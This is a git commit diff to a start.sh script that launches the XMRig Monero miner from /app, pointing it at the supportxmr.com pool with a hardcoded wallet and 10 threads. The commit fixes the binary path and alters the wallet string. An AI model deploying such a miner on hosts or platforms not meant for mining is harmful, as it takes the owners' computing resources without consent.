b7cae0d0e63137908825fb4c92b289748b55d881
Zelticu <Zelticue@gmail.com>
2025-07-18 11:34:18 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 cd /app
-./xmrig \
+./xmrig/xmrig \
   -a rx/0 \
   -o stratum+ssl://pool.supportxmr.com:443 \
-  -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm \
+  -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSV7Gfzfm \
   -p x \
   --threads 10 \
   --cpu-priority 0 \
